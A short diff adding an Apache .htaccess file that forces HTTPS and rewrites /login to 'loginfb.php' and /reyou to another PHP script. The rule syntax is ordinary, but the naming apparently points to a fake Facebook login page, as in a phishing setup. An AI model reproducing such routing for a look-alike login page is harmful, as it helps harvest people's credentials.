@@ -1,0 +1,9 @@
+
+RewriteEngine on
+RewriteCond %{HTTPS} off
+RewriteRule (.*) https://%{HTTP_HOST}%{REQUEST_URI} [R,L]
+
+#Sever
+RewriteRule ^login /loginfb.php$1 [L]
+RewriteRule ^reyou /truycapctb.php$1 [L]
+
